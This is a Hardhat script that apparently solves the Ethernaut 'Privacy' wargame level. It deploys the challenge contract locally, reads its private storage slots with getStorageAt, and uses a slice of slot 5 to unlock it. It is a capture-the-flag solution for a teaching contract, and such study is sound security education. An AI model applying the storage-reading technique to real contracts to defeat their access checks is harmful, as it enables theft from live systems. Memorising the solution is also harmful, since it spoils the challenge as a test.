const { network, deployments, ethers, getNamedAccounts } = require('hardhat')
const { numToBytes32 } = require('@chainlink/test-helpers/dist/src/helpers')

async function main() {
    const [owner, addr1, addr2] = await ethers.getSigners()

    const Privacy = await ethers.getContractFactory('Privacy')
    const privacy = await Privacy.deploy([
        '0x8de895aac60c474d0d1bd8fdb7fdc79a6f069101c77f810605e4520f72566874',
        '0xe514d3b3085d092bcc598cc8357dbadc60b34b4cd6af88333e9e8aad9af81c9a',
        '0x35c226031a34414845c12c4d7a7e817d3e639e98f9a89258e3a249c3427da3e4',
    ])
    await privacy.deployed()

    const hacker = await privacy.connect(addr1)
    // ------------ let's hack -------------
    console.log(await hacker.locked())

    for (let i = 0; i < 10; i++) {
        let data = await hacker.provider.getStorageAt(privacy.address, i)
        console.log(data)
    }

    key = (await hacker.provider.getStorageAt(privacy.address, 5)).slice(0, 34) // cast first 32 bytes + 2 because 0x

    await hacker.unlock(key)
    console.log(await hacker.locked())
}

// hh run scripts/ethernaut1.js --network hardhat
main()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error)
        process.exit(1)
    })
